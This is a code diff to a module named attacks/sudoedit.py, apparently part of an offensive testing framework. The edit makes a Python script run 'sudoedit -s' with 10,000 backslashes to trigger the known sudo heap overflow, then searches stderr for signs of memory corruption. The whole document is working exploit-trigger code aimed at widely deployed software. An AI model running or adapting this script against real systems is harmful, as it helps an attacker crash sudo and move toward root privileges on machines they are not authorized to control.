@@ -1,3 +1,5 @@
+# Path: attacks/sudoedit.py
+
 import subprocess
 
 def run(container=None, simulate=False):
@@ -8,21 +10,24 @@ def run(container=None, simulate=False):
         return "Simulated sudoedit overflow run."
 
     try:
-        # Placeholder for real exploit logic
-        # This command is based on public PoC structure to trigger the overflow
-        overflow_arg = "A" * 10000  # overly long string to cause overflow in vulnerable sudo
+        overflow_arg = "\\" * 10000  # trigger with very long backslashes
+        cmd = ["sudoedit", "-s", overflow_arg]
 
-        result = subprocess.run(
-            ["sudoedit", "-s", overflow_arg],
-            capture_output=True,
-            text=True
-        )
+        print("[*] Executing:", " ".join(cmd))
 
-        if "Segmentation fault" in result.stderr or "malloc" in result.stderr:
-            print("[+] Exploit triggered potential overflow condition.")
-            return "Exploit may have triggered overflow. Further action or chaining required."
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout = result.stdout.strip()
+        stderr = result.stderr.strip()
+
+        print("[+] STDOUT:")
+        print(stdout)
+        print("[+] STDERR:")
+        print(stderr)
+
+        if "malloc" in stderr or "corrupted" in stderr or "Segmentation" in stderr:
+            print("[+] Exploit may have triggered overflow.")
         else:
-            return f"Exploit executed, but no obvious crash: {result.stderr.strip()}"
+            print("[*] Exploit executed, but no obvious crash.")
 
     except Exception as e:
-        return f"Exploit failed: {str(e)}"
+        print(f"[!] Exception occurred: {e}")
